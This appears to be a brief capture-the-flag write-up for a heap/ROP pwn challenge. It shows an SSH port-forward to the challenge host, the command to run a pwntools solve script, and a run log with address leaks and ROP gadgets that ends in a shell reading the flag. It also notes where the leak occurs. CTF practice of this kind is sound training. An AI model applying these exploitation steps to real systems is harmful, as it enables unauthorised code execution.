Port forward challenges from bastion to localhost:
    `ssh <user>@ctf.neg9.net -L 7000:challenges.openctf.cat:9018`

Run exploit with remote option (any arbitrarty argv[1]):
    `./solve.py 1`

Example run:
```
python solve.py 1234
[+] Opening connection to 127.0.0.1 on port 7000: Done
[*] leak 0x5595d5858e10
[*] stderr_leak 0x7f492f003680
[*] libc 0x7f492ec17000
[*] environ 0x7ffef044e2a8
[*] rop_loc 0x7ffef044e090
[*] Loading gadgets for '/home/pwntools/src/libc.so'
[*] mov_rsp 0x7f492ec57568
[*] Switching to interactive mode
 (y/n): 
/bin/sh: 0: can't access tty; job control turned off
$ $ cat flag
flag{fbc9762c3efa4fa4bb00076890c4d81299ccf8cd}
```

As you can see, pwntools takes care of the heavy lifting of this challenge. A rop chain to system("/bin/sh") from libc.so

Leak address occurs in "4. Show book".

List books also seems to do something interesting even with valid input:

```
0 - Title: 121, Pages: [121]
1 - Title: �ξE, Pages: [0, 2]
```
